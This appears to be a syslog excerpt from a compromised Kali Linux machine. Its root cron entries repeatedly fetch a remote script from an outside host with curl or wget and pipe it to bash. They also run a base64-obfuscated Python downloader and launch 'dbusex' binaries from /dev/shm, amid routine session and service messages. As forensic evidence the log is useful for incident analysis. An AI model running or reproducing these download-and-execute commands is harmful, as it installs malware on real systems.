+Nov 23 08:00:30 kali pulseaudio[709690]: E: [alsa-source-ES1371/1] alsa-source.c: We were woken up with POLLIN set -- however a subsequent snd_pcm_avail() returned 0 or another value < min_avail.
+Nov 23 08:00:30 kali dbus-daemon[542]: [system] Activating via systemd: service name='org.bluez' unit='dbus-org.bluez.service' requested by ':1.247' (uid=129 pid=709690 comm="/usr/bin/pulseaudio --daemonize=no ")
+Nov 23 08:00:30 kali dbus-daemon[542]: [system] Activation via systemd failed for unit 'dbus-org.bluez.service': Unit dbus-org.bluez.service not found.
+Nov 23 08:00:30 kali systemd[709665]: Started Sound Service.
+Nov 23 08:00:30 kali pulseaudio[709690]: E: [pulseaudio] bluez5-util.c: GetManagedObjects() failed: org.freedesktop.systemd1.NoSuchUnit: Unit dbus-org.bluez.service not found.
+Nov 23 08:00:30 kali systemd[709665]: Reached target Main User Target.
+Nov 23 08:00:30 kali systemd[709665]: Startup finished in 2.713s.
+Nov 23 08:00:33 kali at-spi-bus-launcher[709700]: dbus-daemon[709700]: Activating service name='org.a11y.atspi.Registry' requested by ':1.0' (uid=129 pid=709691 comm="/usr/sbin/lightdm-gtk-greeter ")
+Nov 23 08:00:33 kali at-spi-bus-launcher[709700]: dbus-daemon[709700]: Successfully activated service 'org.a11y.atspi.Registry'
+Nov 23 08:00:33 kali at-spi-bus-launcher[709719]: SpiRegistry daemon is running with well-known name - org.a11y.atspi.Registry
+Nov 23 08:00:34 kali CRON[709099]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:01:01 kali CRON[709834]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 08:02:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 08:02:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 08:02:01 kali CRON[709964]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 08:02:01 kali CRON[709965]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 08:02:05 kali crontab[709994]: (root) LIST (root)
+Nov 23 08:02:11 kali CRON[709962]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:02:57 kali crontab[710373]: (root) LIST (root)
+Nov 23 08:02:59 kali CRON[709833]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:03:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 08:03:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 08:03:01 kali CRON[710492]: (root) CMD (/dev/shm/dbusex -c  && /home/root/dbusex -c  && /var/run/dbusex -c  && /root/dbusex -c )
+Nov 23 08:03:01 kali CRON[710493]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 08:03:01 kali CRON[710491]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:03:04 kali crontab[710526]: (root) LIST (root)
+Nov 23 08:03:22 kali crontab[710671]: (root) LIST (root)
+Nov 23 08:03:28 kali CRON[709963]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:04:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 08:04:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 08:04:01 kali CRON[710906]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 08:04:01 kali CRON[710907]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 08:04:07 kali crontab[711054]: (root) LIST (root)
+Nov 23 08:04:29 kali CRON[710905]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:05:01 kali CRON[710904]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:05:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 08:05:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 08:05:01 kali CRON[711187]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 08:05:01 kali CRON[711188]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Nov 23 08:05:08 kali CRON[711186]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:05:38 kali lightdm[711201]: Error getting user list from org.freedesktop.Accounts: GDBus.Error:org.freedesktop.DBus.Error.ServiceUnknown: The name org.freedesktop.Accounts was not provided by any .service files
+Nov 23 08:05:39 kali CRON[710490]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:05:40 kali systemd[1]: Stopping Session c8 of user lightdm.
+Nov 23 08:05:40 kali systemd[709665]: pulseaudio.service: Succeeded.
+Nov 23 08:05:40 kali systemd[1]: session-c8.scope: Succeeded.
+Nov 23 08:05:40 kali systemd[1]: Stopped Session c8 of user lightdm.
+Nov 23 08:05:50 kali systemd[1]: Stopping User Manager for UID 129...
+Nov 23 08:05:50 kali systemd[709665]: Stopped target Main User Target.
+Nov 23 08:05:50 kali systemd[709665]: Stopping Accessibility services bus...
+Nov 23 08:05:50 kali systemd[709665]: Stopping D-Bus User Message Bus...
+Nov 23 08:05:50 kali systemd[709665]: Stopping Virtual filesystem service...
+Nov 23 08:05:50 kali systemd[709665]: at-spi-dbus-bus.service: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Stopped Accessibility services bus.
+Nov 23 08:05:50 kali systemd[709665]: dbus.service: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Stopped D-Bus User Message Bus.
+Nov 23 08:05:50 kali systemd[709665]: gvfs-daemon.service: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Stopped Virtual filesystem service.
+Nov 23 08:05:50 kali systemd[709665]: Stopped target Basic System.
+Nov 23 08:05:50 kali systemd[709665]: Stopped target Paths.
+Nov 23 08:05:50 kali systemd[709665]: Stopped target Sockets.
+Nov 23 08:05:50 kali systemd[709665]: Stopped target Timers.
+Nov 23 08:05:50 kali systemd[709665]: dbus.socket: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Closed D-Bus User Message Bus Socket.
+Nov 23 08:05:50 kali systemd[709665]: dirmngr.socket: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Closed GnuPG network certificate management daemon.
+Nov 23 08:05:50 kali systemd[709665]: gpg-agent-browser.socket: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Nov 23 08:05:50 kali systemd[709665]: gpg-agent-extra.socket: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Nov 23 08:05:50 kali systemd[709665]: gpg-agent-ssh.socket: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Nov 23 08:05:50 kali systemd[709665]: gpg-agent.socket: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Closed GnuPG cryptographic agent and passphrase cache.
+Nov 23 08:05:50 kali systemd[709665]: pk-debconf-helper.socket: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Closed debconf communication socket.
+Nov 23 08:05:50 kali systemd[709665]: pulseaudio.socket: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Closed Sound System.
+Nov 23 08:05:50 kali systemd[709665]: Reached target Shutdown.
+Nov 23 08:05:50 kali systemd[709665]: systemd-exit.service: Succeeded.
+Nov 23 08:05:50 kali systemd[709665]: Finished Exit the Session.
+Nov 23 08:05:50 kali systemd[709665]: Reached target Exit the Session.
+Nov 23 08:05:50 kali systemd[1]: user@129.service: Succeeded.
+Nov 23 08:05:50 kali systemd[1]: Stopped User Manager for UID 129.
+Nov 23 08:05:50 kali systemd[1]: Stopping User Runtime Directory /run/user/129...
+Nov 23 08:05:50 kali systemd[1]: run-user-129.mount: Succeeded.
+Nov 23 08:05:50 kali systemd[777]: run-user-129.mount: Succeeded.
+Nov 23 08:05:50 kali systemd[1]: user-runtime-dir@129.service: Succeeded.
+Nov 23 08:05:50 kali systemd[1]: Stopped User Runtime Directory /run/user/129.
+Nov 23 08:05:50 kali systemd[1]: Removed slice User Slice of UID 129.
